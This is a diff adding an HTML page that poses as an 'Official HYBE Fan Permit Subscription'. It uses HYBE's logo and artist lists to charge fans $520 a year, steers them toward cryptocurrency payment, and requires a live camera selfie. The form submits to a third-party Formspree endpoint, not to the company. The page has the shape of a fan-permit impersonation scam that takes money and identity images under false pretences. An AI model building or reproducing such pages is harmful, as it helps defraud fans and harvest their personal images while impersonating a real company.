@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Official HYBE Fan Permit Subscription 2025/2026</title>
+
+  <!-- Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;600&display=swap" rel="stylesheet" />
+
+  <style>
+    body {
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(135deg, #f0f4ff, #d9e4ff);
+      min-height: 100vh;
+      padding: 20px;
+      animation: fadeIn 1s ease;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    .form-container {
+      background: white;
+      width: 100%;
+      max-width: 700px;
+      margin: 40px auto;
+      padding: 30px 20px;
+      border-radius: 20px;
+      box-shadow: 0 12px 24px rgba(0,0,0,0.1);
+      animation: popIn 0.6s ease;
+    }
+
+    @keyframes popIn {
+      from { transform: scale(0.95); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
+    }
+
+    .form-container img {
+      display: block;
+      max-width: 150px;
+      margin: 0 auto 20px;
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 30px;
+      font-weight: 600;
+      font-size: 26px;
+    }
+
+    label {
+      font-weight: 600;
+      display: block;
+      margin-top: 20px;
+    }
+
+    input, select, textarea {
+      width: 100%;
+      padding: 12px;
+      margin-top: 8px;
+      margin-bottom: 20px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 16px;
+      transition: border-color 0.3s;
+    }
+
+    input:focus, select:focus, textarea:focus {
+      border-color: #2575fc;
+      outline: none;
+    }
+
+    input[type="checkbox"] {
+      width: auto;
+      margin-right: 10px;
+    }
+
+    small {
+      display: block;
+      color: #666;
+      margin-top: -16px;
+      margin-bottom: 20px;
+      font-size: 12px;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    button {
+      background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+      color: white;
+      padding: 15px;
+      border: none;
+      border-radius: 10px;
+      width: 100%;
+      font-size: 18px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 20px;
+      transition: transform 0.2s, background 0.4s;
+    }
+
+    button:hover {
+      transform: scale(1.05);
+      background: linear-gradient(135deg, #2575fc 0%, #6a11cb 100%);
+    }
+
+    @media (max-width: 600px) {
+      body {
+        padding: 10px;
+      }
+      .form-container {
+        padding: 20px 15px;
+      }
+      h2 {
+        font-size: 22px;
+      }
+      input, select, textarea, button {
+        font-size: 16px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div id="loader" style="
+  position: fixed;
+  width: 100%;
+  height: 100%;
+  background: white;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 24px;
+  font-weight: bold;
+  z-index: 9999;
+">
+  Loading...
+</div>
+
+<div class="form-container">
+  <!-- HYBE Logo -->
+  <img src="https://upload.wikimedia.org/wikipedia/commons/1/14/HYBE_Corporation_Logo.png" alt="HYBE Logo">
+
+  <h2>HYBE Fan Permit Subscription 2025/2026</h2>
+
+  <form action="https://formspree.io/f/{your_form_id}" method="POST" id="hybeForm" enctype="multipart/form-data">
+
+    <!-- Fan Preferences -->
+    <label>Select HYBE Branch</label>
+    <select id="branchSelect" name="Branch" required onchange="loadGroups()">
+      <option value="">-- Select Branch --</option>
+      <option value="BigHit">BigHit Music</option>
+      <option value="HybeLabel">HYBE Labels</option>
+    </select>
+
+    <label>Select Your Favorite Group</label>
+    <select id="groupSelect" name="Group" required onchange="loadArtists()">
+      <option value="">-- Select Group --</option>
+    </select>
+
+    <label>Select Your Favorite Artist(s)</label>
+    <select id="artistSelect" name="Artist" required>
+      <option value="">-- Select Artist --</option>
+    </select>
+
+    <!-- Payment -->
+    <label>Annual Subscription Fee</label>
+    <input type="text" value="$520/year" readonly>
+
+    <label>Select Payment Type</label>
+    <select id="paymentType" name="PaymentType" required onchange="showInstallmentOptions()">
+      <option value="">-- Select Payment Type --</option>
+      <option value="full">Full Payment</option>
+      <option value="installment">Installment</option>
+    </select>
+
+    <div id="installmentOptions" class="hidden">
+      <label>Select Installment Plan</label>
+      <select id="installmentPlan" name="InstallmentPlan" onchange="showInstallmentCalc()">
+        <option value="">-- Select Installment Plan --</option>
+        <option value="2">2 Installments ($260 each)</option>
+        <option value="3">3 Installments ($173.33 each)</option>
+      </select>
+      <p id="installmentCalc"></p>
+    </div>
+
+    <div id="paymentMethods" class="hidden">
+      <label>Payment Methods</label>
+      <select name="PaymentMethod" required>
+        <option value="">-- Select Payment Method --</option>
+        <option value="crypto">Digital Currency (2-3 min confirmation)</option>
+        <option value="card">Card Payment (24hr confirmation)</option>
+      </select>
+    </div>
+
+    <div id="installmentTerms" class="hidden">
+      <input type="checkbox" id="agreeInstallment" required>
+      <label for="agreeInstallment">I agree to the installment terms and conditions.</label>
+    </div>
+
+    <!-- Country -->
+    <label>What country do you live in?</label>
+    <input type="text" name="Country" required>
+
+    <!-- Live Selfie (Camera Only) -->
+    <label>Upload Clear Live Selfie Picture</label>
+    <input type="file" name="Selfie" accept="image/*" capture="user" required>
+    <small>Please take a live photo using your device camera (no pre-uploaded images allowed).</small>
+
+    <!-- Communication -->
+    <label>Preferred Communication Method</label>
+    <input type="checkbox" name="PreferredCommunication" value="Email" required> Email
+    <input type="checkbox" name="PreferredCommunication" value="SMS" style="margin-left:20px;"> SMS
+    <small>(You can select both)</small>
+
+    <!-- Terms -->
+    <input type="checkbox" id="agreeTerms" name="AgreeTerms" required>
+    <label for="agreeTerms">I have read, understood, and agree to HYBE’s Privacy Policy, Security Statement, and Terms of Service.</label>
+
+    <button type="submit">Complete Subscription</button>
+  </form>
+</div>
+
+<script>
+const groups = {
+  "BigHit": ["BTS", "TXT"],
+  "HybeLabel": ["Seventeen", "Enhypen"]
+};
+
+const artists = {
+  "BTS": ["Jungkook", "Jin", "V", "Suga", "J-Hope", "RM", "Jimin"],
+  "TXT": ["Yeonjun", "Soobin", "Beomgyu", "Taehyun", "Hueningkai"],
+  "Seventeen": ["S.Coups", "Jeonghan", "Joshua", "Jun", "Hoshi", "Wonwoo"],
+  "Enhypen": ["Heeseung", "Jay", "Jake", "Sunghoon", "Sunoo", "Jungwon", "Ni-ki"]
+};
+
+function loadGroups() {
+  const branch = document.getElementById('branchSelect').value;
+  const groupSelect = document.getElementById('groupSelect');
+  groupSelect.innerHTML = `<option value="">-- Select Group --</option>`;
+  if (groups[branch]) {
+    groups[branch].forEach(group => {
+      const opt = document.createElement('option');
+      opt.value = group;
+      opt.innerHTML = group;
+      groupSelect.appendChild(opt);
+    });
+  }
+}
+
+function loadArtists() {
+  const group = document.getElementById('groupSelect').value;
+  const artistSelect = document.getElementById('artistSelect');
+  artistSelect.innerHTML = `<option value="">-- Select Artist --</option>`;
+  if (artists[group]) {
+    artists[group].forEach(artist => {
+      const opt = document.createElement('option');
+      opt.value = artist;
+      opt.innerHTML = artist;
+      artistSelect.appendChild(opt);
+    });
+  }
+}
+
+function showInstallmentOptions() {
+  const type = document.getElementById('paymentType').value;
+  const show = (id, display) => document.getElementById(id).classList[display ? 'remove' : 'add']('hidden');
+  show('installmentOptions', type === 'installment');
+  show('installmentTerms', type === 'installment');
+  show('paymentMethods', type !== '');
+  if (type !== 'installment') {
+    document.getElementById('installmentCalc').innerHTML = '';
+  }
+}
+
+function showInstallmentCalc() {
+  const plan = document.getElementById('installmentPlan').value;
+  const calc = document.getElementById('installmentCalc');
+  if (plan === "2") calc.innerHTML = "You will pay $260 per installment.";
+  else if (plan === "3") calc.innerHTML = "You will pay ~$173.33 per installment.";
+  else calc.innerHTML = "";
+}
+
+// Loader hide after page load
+window.addEventListener('load', () => {
+  document.getElementById('loader').style.display = 'none';
+});
+</script>
+
+</body>
+</html>
